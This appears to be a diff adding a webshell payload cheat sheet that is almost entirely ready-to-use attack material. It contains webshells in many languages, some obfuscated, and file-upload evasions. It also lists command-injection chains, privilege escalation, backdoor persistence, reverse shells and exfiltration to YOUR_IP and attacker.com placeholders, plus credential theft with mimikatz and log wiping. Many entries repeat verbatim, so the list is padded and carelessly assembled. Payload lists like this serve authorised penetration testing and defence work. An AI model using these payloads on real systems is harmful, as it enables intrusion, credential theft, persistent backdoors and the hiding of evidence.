@@ -1,0 +1,601 @@
+# ============================================
+# COMPLETE WEBSHELL PAYLOAD LIST (2026)
+# FOR AUTHORIZED SECURITY TESTING ONLY
+# ============================================
+
+# ==================== PHP WEBSHELLS ====================
+
+# Basic PHP Webshells
+<?php system($_GET['cmd']); ?>
+<?php exec($_GET['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php eval($_POST['cmd']); ?>
+<?php assert($_POST['cmd']); ?>
+<?php `$_GET[cmd]`; ?>
+<?php include($_GET['file']); ?>
+<?php require($_GET['file']); ?>
+<?php file_get_contents($_GET['file']); ?>
+<?php popen($_GET['cmd'], 'r'); ?>
+<?php proc_open($_GET['cmd'], $descriptors, $pipes); ?>
+
+# Obfuscated PHP Webshells
+<?php $_GET[chr(99).chr(109).chr(100)]($_POST[chr(120)]); ?>
+<?php $cmd = base64_decode($_GET['c']); system($cmd); ?>
+<?php eval(gzinflate(base64_decode($_POST['x']))); ?>
+<?php $a="s y s t e m";$b=explode(" ",$a);$b[0]($_GET['c']);?>
+<?php @preg_replace("/.*/e",$_POST['c'],""); ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?= system($_GET['cmd']); ?>
+<?= exec($_GET['cmd']); ?>
+<?= `$_GET[cmd]`; ?>
+<?php /* GIF89a */ system($_GET['cmd']); ?>
+<?php /* system */ $_GET['cmd']; ?>
+<?php $p = "_" . "POST"; $c = $_$p['cmd']; eval($c); ?>
+<?php $f = 'system'; $f($_GET['x']); ?>
+<?php array_map($_GET['f'], $_GET['p']); ?>
+<?php $a = 'sys'.'tem'; $a($_GET['cmd']); ?>
+<?php $$_GET['f']($_GET['p']); ?>
+<?php array_map($_GET['f'], $_GET['p']); ?>
+<?php preg_replace('/.*/e', $_POST['c'], ''); ?>
+<?php $f = create_function('', $_POST['c']); $f(); ?>
+<?php assert($_POST['c']); ?>
+<?php $_SERVER['HTTP_USER_AGENT']($_GET['cmd']); ?>
+<?php $_COOKIE['cmd']($_GET['x']); ?>
+<?php $_FILES['file']['name']($_GET['cmd']); ?>
+<?php include('data://text/plain;base64,'.base64_encode($_POST['cmd'])); ?>
+<?php include($_GET['url']); ?>
+<?php require('http://attacker.com/shell.txt'); ?>
+<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw==')); ?>
+<?php eval(str_rot13('flfgrz($_{TRG["pzq"]});')); ?>
+<?php eval($_=~"SYS"^"???";$$_[$_]($_[_])); ?>
+<?php $a = $_POST['a']; $$a = $_POST['b']; ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?php $a = $_POST['a']; $$a = $_POST['b']; ?>
+<?php $cmd = base64_decode($_GET['c']); system($cmd); ?>
+<?php @preg_replace("/.*/e",$_POST['c'],""); ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?php $f = 'system'; $f($_GET['x']); ?>
+<?php array_map($_GET['f'], $_GET['p']); ?>
+<?php $_SERVER['HTTP_USER_AGENT']($_GET['cmd']); ?>
+<?php $_COOKIE['cmd']($_GET['x']); ?>
+<?php $_FILES['file']['name']($_GET['cmd']); ?>
+<?php include('data://text/plain;base64,'.base64_encode($_POST['cmd'])); ?>
+<?php include($_GET['url']); ?>
+<?php require('http://attacker.com/shell.txt'); ?>
+<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw==')); ?>
+<?php eval(str_rot13('flfgrz($_{TRG["pzq"]});')); ?>
+<?php eval($_=~"SYS"^"???";$$_[$_]($_[_])); ?>
+
+# Advanced PHP Webshells (2026)
+<?php $key = $_SERVER['HTTP_X_AUTH_TOKEN'] ?? ''; $cmd = $_SERVER['HTTP_X_CMD'] ?? ''; if(hash_equals(md5($key), '5f4dcc3b5aa765d61d8327deb882cf99')) { system($cmd); } ?>
+<?php file_put_contents('/tmp/shell.php', '<?php system($_GET["c"]); ?>'); include('/tmp/shell.php'); unlink(__FILE__); ?>
+<?php /* <?php system($_GET['cmd']); ?> */ $exif = exif_read_data($_FILES['image']['tmp_name']); eval($exif['Comment']); ?>
+<?php if($_GET['cmd'] == 'destroy') { unlink(__FILE__); exit; } system($_GET['cmd']); ?>
+<?php $_GET[chr(99).chr(109).chr(100)]($_POST[chr(120)]); ?>
+<?php $cmd = base64_decode($_GET['c']); system($cmd); ?>
+<?php eval(gzinflate(base64_decode($_POST['x']))); ?>
+<?php $a="s y s t e m";$b=explode(" ",$a);$b[0]($_GET['c']);?>
+<?php @preg_replace("/.*/e",$_POST['c'],""); ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?php $a = $_POST['a']; $$a = $_POST['b']; ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?php $f = 'system'; $f($_GET['x']); ?>
+<?php array_map($_GET['f'], $_GET['p']); ?>
+<?php $_SERVER['HTTP_USER_AGENT']($_GET['cmd']); ?>
+<?php $_COOKIE['cmd']($_GET['x']); ?>
+<?php $_FILES['file']['name']($_GET['cmd']); ?>
+<?php include('data://text/plain;base64,'.base64_encode($_POST['cmd'])); ?>
+<?php include($_GET['url']); ?>
+<?php require('http://attacker.com/shell.txt'); ?>
+<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw==')); ?>
+<?php eval(str_rot13('flfgrz($_{TRG["pzq"]});')); ?>
+<?php eval($_=~"SYS"^"???";$$_[$_]($_[_])); ?>
+<?php $a = $_POST['a']; $$a = $_POST['b']; ?>
+<?php $x=$_GET['x'];`$x`; ?>
+<?php $f = 'system'; $f($_GET['x']); ?>
+<?php array_map($_GET['f'], $_GET['p']); ?>
+<?php $_SERVER['HTTP_USER_AGENT']($_GET['cmd']); ?>
+<?php $_COOKIE['cmd']($_GET['x']); ?>
+<?php $_FILES['file']['name']($_GET['cmd']); ?>
+<?php include('data://text/plain;base64,'.base64_encode($_POST['cmd'])); ?>
+<?php include($_GET['url']); ?>
+<?php require('http://attacker.com/shell.txt'); ?>
+<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw==')); ?>
+<?php eval(str_rot13('flfgrz($_{TRG["pzq"]});')); ?>
+<?php eval($_=~"SYS"^"???";$$_[$_]($_[_])); ?>
+
+# ==================== ASP/ASPX WEBSHELLS ====================
+
+<% Execute(Request("cmd")) %>
+<% eval(Request("cmd")) %>
+<% Response.Write(Shell("cmd.exe /c " & Request("cmd"))) %>
+<% @Page Language="JScript"%><%eval(Request.Item["cmd"],"unsafe");%>
+<%@ Page Language="C#" %> <%=System.Diagnostics.Process.Start("cmd.exe", Request["cmd"])%>
+<% Response.Write(Shell("cmd.exe /c " & Request("cmd"))) %>
+<% @Page Language="JScript"%><%eval(Request.Item["cmd"],"unsafe");%>
+<%@ Page Language="C#" %> <%=System.Diagnostics.Process.Start("cmd.exe", Request["cmd"])%>
+
+# ==================== JSP WEBSHELLS ====================
+
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# ==================== PYTHON WEBSHELLS ====================
+
+__import__('os').system(request.GET['cmd'])
+exec(request.GET['cmd'])
+eval(compile(request.GET['cmd'], '<string>', 'exec'))
+__import__('subprocess').check_output(request.GET['cmd'], shell=True)
+__import__('os').system(request.GET['cmd'])
+exec(request.GET['cmd'])
+eval(compile(request.GET['cmd'], '<string>', 'exec'))
+__import__('subprocess').check_output(request.GET['cmd'], shell=True)
+
+# ==================== NODE.JS WEBSHELLS ====================
+
+require('child_process').exec(req.query.cmd)
+process.mainModule.require('child_process').exec(req.query.cmd)
+eval(req.query.cmd)
+require('child_process').exec(req.query.cmd)
+process.mainModule.require('child_process').exec(req.query.cmd)
+eval(req.query.cmd)
+
+# ==================== PERL WEBSHELLS ====================
+
+system($ENV{'QUERY_STRING'});
+exec($ENV{'QUERY_STRING'});
+`$ENV{'QUERY_STRING'}`;
+system($ENV{'QUERY_STRING'});
+exec($ENV{'QUERY_STRING'});
+`$ENV{'QUERY_STRING'}`;
+
+# ==================== RUBY WEBSHELLS ====================
+
+%x[#{params['cmd']}]
+`#{params['cmd']}`
+system(params['cmd'])
+exec(params['cmd'])
+%x[#{params['cmd']}]
+`#{params['cmd']}`
+system(params['cmd'])
+exec(params['cmd'])
+
+# ==================== SHELL-SCRIPT WEBSHELLS ====================
+
+#!/bin/bash
+echo "Content-type: text/html"
+echo ""
+echo "$QUERY_STRING" | /bin/sh
+
+#!/bin/sh
+eval "$(echo $QUERY_STRING | sed 's/+/ /g')"
+
+# ==================== FILE UPLOAD EVASIONS ====================
+
+# Double Extensions
+shell.php.jpg
+shell.php.jpeg
+shell.php.png
+shell.php.gif
+shell.php;.jpg
+shell.php%00.jpg
+shell.php%0a.jpg
+shell.php%0d%0a.jpg
+shell.asp;.jpg
+shell.aspx;.jpg
+shell.jsp;.jpg
+shell.php.jpg
+shell.php.jpeg
+shell.php.png
+shell.php.gif
+shell.php;.jpg
+shell.php%00.jpg
+shell.php%0a.jpg
+shell.php%0d%0a.jpg
+shell.asp;.jpg
+shell.aspx;.jpg
+shell.jsp;.jpg
+
+# Alternative Extensions
+shell.phtml
+shell.php5
+shell.php4
+shell.phar
+shell.inc
+shell.php3
+shell.asp
+shell.aspx
+shell.jsp
+shell.jhtml
+shell.shtml
+shell.phtml
+shell.php5
+shell.php4
+shell.phar
+shell.inc
+shell.php3
+shell.asp
+shell.aspx
+shell.jsp
+shell.jhtml
+shell.shtml
+
+# Content-Type Bypasses
+Content-Type: image/jpeg
+Content-Type: image/gif
+Content-Type: image/png
+Content-Type: application/x-php
+Content-Type: text/plain
+Content-Type: multipart/form-data
+Content-Type: application/octet-stream
+Content-Type: image/jpeg
+Content-Type: image/gif
+Content-Type: image/png
+Content-Type: application/x-php
+Content-Type: text/plain
+Content-Type: multipart/form-data
+Content-Type: application/octet-stream
+
+# ==================== SQL INJECTION TO WEBSHELL ====================
+
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
+UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"
+SELECT <?php system($_GET['cmd']); ?> INTO DUMPFILE '/var/www/html/shell.php'
+COPY (SELECT '<?php system($_GET['cmd']); ?>') TO '/var/www/html/shell.php';
+EXEC xp_cmdshell 'echo <?php system($_GET["cmd"]); ?> > C:\inetpub\wwwroot\shell.php'
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
+UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"
+SELECT <?php system($_GET['cmd']); ?> INTO DUMPFILE '/var/www/html/shell.php'
+COPY (SELECT '<?php system($_GET['cmd']); ?>') TO '/var/www/html/shell.php';
+EXEC xp_cmdshell 'echo <?php system($_GET["cmd"]); ?> > C:\inetpub\wwwroot\shell.php'
+
+# ==================== COMMAND EXECUTION PAYLOADS ====================
+
+# Basic System Commands
+cmd=id
+cmd=whoami
+cmd=ls
+cmd=dir
+cmd=pwd
+cmd=uname -a
+cmd=cat /etc/passwd
+cmd=type C:\Windows\win.ini
+cmd=hostname
+cmd=ifconfig
+cmd=ipconfig /all
+cmd=netstat -an
+cmd=route -n
+
+# Command Chaining
+cmd=whoami;id;hostname;uname -a
+cmd=whoami|id|hostname|uname -a
+cmd=whoami&&id&&hostname&&uname -a
+cmd=$(whoami)
+cmd=`whoami`
+cmd=whoami;$(cat /etc/passwd)
+cmd=date;whoami
+cmd=date|whoami
+cmd=date&&whoami
+cmd=date%0awhoami
+cmd=date%00whoami
+cmd=date${IFS}whoami
+cmd=date%26%26whoami
+cmd=date%7Cwhoami
+cmd=date%3Bwhoami
+cmd=date%7C%7Cwhoami
+cmd=date%26whoami
+cmd=date%60whoami%60
+cmd=date;whoami;id;pwd;hostname;uname -a;ls -la
+cmd=date%26%26whoami%26%26id%26%26pwd
+cmd=date%7Cwhoami%7Cid%7Cpwd
+cmd=date && cat /etc/passwd
+cmd=date && cat /etc/shadow
+cmd=date && cat /etc/hosts
+cmd=date && cat /proc/self/environ
+cmd=date && ls -la /
+
+# Time-Based Testing
+cmd=date && sleep 5
+cmd=date && ping -c 5 127.0.0.1
+cmd=date && timeout 5 sleep 10
+
+# Error-Based Testing
+cmd=date && ls /nonexistent 2>&1
+cmd=date && cat /etc/hosts 2>&1 | grep -v "^#"
+
+# ==================== PRIVILEGE ESCALATION ====================
+
+# Linux Privilege Escalation
+cmd=find / -perm -4000 -type f 2>/dev/null
+cmd=find / -perm -4000 -exec whoami \;
+cmd=find / -perm -4000 -exec /bin/bash -p \;
+cmd=sudo -l
+cmd=sudo /bin/bash
+cmd=cat /etc/crontab
+cmd=ls -la /etc/cron*
+cmd=echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" >> /etc/crontab
+cmd=uname -a
+cmd=cat /proc/version
+cmd=searchsploit linux kernel 5.15
+
+# Windows Privilege Escalation
+cmd=whoami /all
+cmd=net user
+cmd=net localgroup administrators
+cmd=net group "Domain Admins" /domain
+cmd=sc query
+cmd=wmic service list brief
+cmd=sc config ServiceName binPath= "C:\path\to\malware.exe"
+cmd=sc start ServiceName
+cmd=reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+cmd=schtasks /query /fo LIST /v
+
+# ==================== PERSISTENCE TECHNIQUES ====================
+
+# Linux Persistence
+cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /root/.ssh/authorized_keys
+cmd=useradd -m -s /bin/bash backdoor
+cmd=echo "backdoor:password123" | chpasswd
+cmd=(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -
+cmd=echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"' >> /etc/crontab
+cmd=echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> /root/.ssh/authorized_keys
+
+# Windows Persistence
+cmd=copy C:\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+cmd=reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\shell.exe"
+cmd=reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\shell.exe"
+cmd=schtasks /create /tn "Backdoor" /tr "C:\shell.exe" /sc daily /st 00:00
+
+# ==================== DATA EXFILTRATION ====================
+
+# HTTP Exfiltration
+cmd=curl -X POST -d @/etc/passwd http://YOUR_IP/exfil.php
+cmd=wget --post-file=/etc/passwd http://YOUR_IP/exfil.php
+cmd=openssl enc -aes-256-cbc -in /etc/passwd -pass pass:password -out /tmp/data.enc
+cmd=curl -F "file=@/tmp/data.enc" http://YOUR_IP/upload.php
+cmd=curl http://YOUR_IP/$(whoami)
+cmd=nslookup $(whoami).YOUR_SERVER.com
+
+# DNS Exfiltration
+cmd=nslookup $(cat /etc/passwd | base64 -w0).YOUR_DOMAIN.com
+cmd=dig +short $(whoami).YOUR_DOMAIN.com TXT
+
+# ICMP Exfiltration
+cmd=cat /etc/passwd | base64 | while read line; do ping -c 1 -p $line YOUR_IP; done
+
+# FTP Exfiltration
+cmd=curl -T /etc/passwd ftp://YOUR_IP --user user:pass
+
+# ==================== REVERSE SHELLS ====================
+
+# Bash Reverse Shell
+cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+cmd=bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+cmd=/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+
+# Netcat Reverse Shell
+cmd=nc -e /bin/sh YOUR_IP 4444
+cmd=nc -e /bin/bash YOUR_IP 4444
+cmd=nc -c /bin/sh YOUR_IP 4444
+
+# Python Reverse Shell
+cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# PHP Reverse Shell
+cmd=php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Perl Reverse Shell
+cmd=perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby Reverse Shell
+cmd=ruby -rsocket -e'f=TCPSocket.open("YOUR_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Telnet Reverse Shell
+cmd=telnet YOUR_IP 4444 | /bin/bash | telnet YOUR_IP 4445
+
+# ==================== ADVANCED EXPLOITATION TECHNIQUES ====================
+
+# HTTP/2 Request Smuggling
+POST /shell.php HTTP/2\r\n\r\ncmd=whoami
+
+# Chunked Encoding Bypass
+POST /shell.php HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n5\r\ncmd=w\r\n5\r\nhoami\r\n0\r\n\r\n
+
+# Parameter Pollution
+cmd=whoami&cmd=id
+cmd[]=whoami&cmd[]=id
+
+# Unicode Normalization
+cmd=ｗｈｏａｍｉ
+cmd=whoami%00@example.com
+
+# Double Encoding
+cmd=%2563%2561%2574%2520%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564
+
+# Null Byte Injection
+cmd=id%00whoami
+cmd=date%00whoami
+cmd=date%00;whoami
+cmd=date%00||whoami
+
+# Whitespace Bypasses
+cmd=date%0Awhoami
+cmd=date%0D%0Awhoami
+cmd=date%09whoami
+cmd=date%20%26%26%20whoami
+cmd=date$IFSwhoami
+cmd=date${IFS}whoami
+cmd=date$()whoami
+cmd=date$(whoami)
+
+# Wildcard Bypasses
+cmd=/usr/bin/date
+cmd=/bin/date
+cmd=./date
+cmd=date%00/../../bin/date
+
+# ==================== WAF/IDS BYPASS PAYLOADS ====================
+
+# Case Variation
+cmd=Id
+cmd=ID
+cmd=iD
+cmd=WhoAmI
+cmd=WHOAMI
+
+# Comment Injection
+cmd=date;whoami
+cmd=date||whoami
+cmd=date&&whoami
+cmd=date|whoami
+cmd=date`whoami`
+cmd=$(date)
+cmd=`date`
+
+# Alternative Command Execution
+cmd=date|awk '{system("whoami")}'
+cmd=date;python -c 'import os; os.system("whoami")'
+cmd=date;perl -e 'system("whoami")'
+cmd=date;ruby -e 'exec "whoami"'
+cmd=sh -c "date;whoami"
+cmd=bash -c "date;whoami"
+
+# ==================== WEB SHELL DEPLOYMENT ====================
+
+cmd=date && echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+cmd=date && wget http://attacker.com/shell.php -O /var/www/html/shell.php
+cmd=date && curl http://attacker.com/shell.php -o /var/www/html/shell.php
+cmd=date && echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
+
+# ==================== DATABASE EXPLOITATION ====================
+
+# MySQL
+cmd=mysql -u root -p -e "SHOW DATABASES;"
+cmd=mysqldump -u root -pPassword123 --all-databases > /tmp/db.sql
+cmd=mysql -u root -pPassword123 -e "SELECT * FROM users" > /tmp/users.txt
+
+# PostgreSQL
+cmd=psql -U postgres -c "\l"
+cmd=pg_dump -U postgres -h localhost -d database > /tmp/db.sql
+
+# MongoDB
+cmd=mongo --eval "db.adminCommand('listDatabases')"
+
+# ==================== NETWORK ENUMERATION ====================
+
+# Port Scanning
+cmd=nmap -sS -p 1-1000 192.168.1.1/24
+cmd=for /L %i in (1,1,255) do ping -n 1 192.168.1.%i | find "Reply"
+cmd=nmap -sn 192.168.1.0/24
+cmd=arp -a
+
+# Service Enumeration
+cmd=smbclient -L //192.168.1.10
+cmd=enum4linux 192.168.1.10
+cmd=ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com"
+cmd=net view
+cmd=net group "Domain Admins" /domain
+
+# ==================== CREDENTIAL THEFT ====================
+
+# Linux Credentials
+cmd=cat /etc/shadow
+cmd=unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
+cmd=cat ~/.bash_history
+cmd=cat ~/.mysql_history
+cmd=cat ~/.ssh/id_rsa
+
+# Windows Credentials
+cmd=reg save hklm\sam C:\sam.save
+cmd=reg save hklm\system C:\system.save
+cmd=mimikatz.exe privilege::debug sekurlsa::logonpasswords
+cmd=mimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords
+
+# ==================== CLEANUP TECHNIQUES ====================
+
+# Linux Cleanup
+cmd=history -c
+cmd=rm -rf ~/.bash_history
+cmd=unset HISTFILE
+cmd=cat /dev/null > /var/log/auth.log
+cmd=cat /dev/null > /var/log/syslog
+cmd=cat /dev/null > /var/log/apache2/access.log
+cmd=rm -rf /var/www/html/shell.php
+
+# Windows Cleanup
+cmd=wevtutil cl Application
+cmd=wevtutil cl Security
+cmd=wevtutil cl System
+cmd=Clear-History
+cmd=Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+# ==================== XSS + WEBSHELL COMBINED ====================
+
+<img src=x onerror="fetch('shell.php?cmd='+document.cookie)">
+<script>fetch('/shell.php?cmd='+btoa(document.cookie))</script>
+<svg/onload="eval(atob('c3lzdGVtKCdpZCcp'))">
+<img src=x onerror="eval(atob('c3lzdGVtKCdpZCcp'))">
+
+# ==================== URL ENCODED PAYLOADS ====================
+
+cmd=%69%64
+cmd=%77%68%6F%61%6D%69
+cmd=%6C%73%20%2D%6C%61
+cmd=%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64
+cmd=%64%61%74%65%3B%77%68%6F%61%6D%69
+cmd=%64%61%74%65%7C%77%68%6F%61%6D%69
+cmd=%64%61%74%65%26%26%77%68%6F%61%6D%69
+cmd=%64%61%74%65%25%30%61%77%68%6F%61%6D%69
+
+# ==================== BASE64 ENCODED PAYLOADS ====================
+
+cmd=echo%20%22d2hvYW1p%22%7Cbase64%20-d%7Csh
+cmd=echo%20%22Y2F0IC9ldGMvcGFzc3dk%22%7Cbase64%20-d%7Csh
+cmd=echo%20%22bHMgLWxh%22%7Cbase64%20-d%7Csh
+cmd=echo%20%22aWQ=%22%7Cbase64%20-d%7Csh
+
+# ==================== HEX ENCODED PAYLOADS ====================
+
+cmd=printf%20%22%77%68%6F%61%6D%69%22%7Csh
+cmd=printf%20%22%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64%22%7Csh
+cmd=printf%20%22%6C%73%20%2D%6C%61%22%7Csh
+cmd=printf%20%22%69%64%22%7Csh
+
+# ==================== ADDITIONAL PAYLOADS ====================
+
+# PHP Info Disclosure
+cmd=php -r "phpinfo();"
+
+# File System Operations
+cmd=find / -name "*.txt" -type f 2>/dev/null
+cmd=find / -name "*.conf" -type f 2>/dev/null
+cmd=find / -name "*.sql" -type f 2>/dev/null
+cmd=find / -name "*pass*" -type f 2>/dev/null
+
+# Process Enumeration
+cmd=ps aux
+cmd=ps -ef
+cmd=top -b -n 1
+cmd=tasklist
+
+# Service Enumeration
+cmd=systemctl list-units
+cmd=service --status-all
+cmd=sc query state= all
+
+# Network Connections
+cmd=netstat -tulpn
+cmd=netstat -ano
+cmd=lsof -i
+cmd=ss -tulpn
+
+# Firewall Enumeration
+cmd=iptables -L
+cmd=nft list ruleset
+cmd=ufw status
+cmd=netsh advfirewall show allprofiles
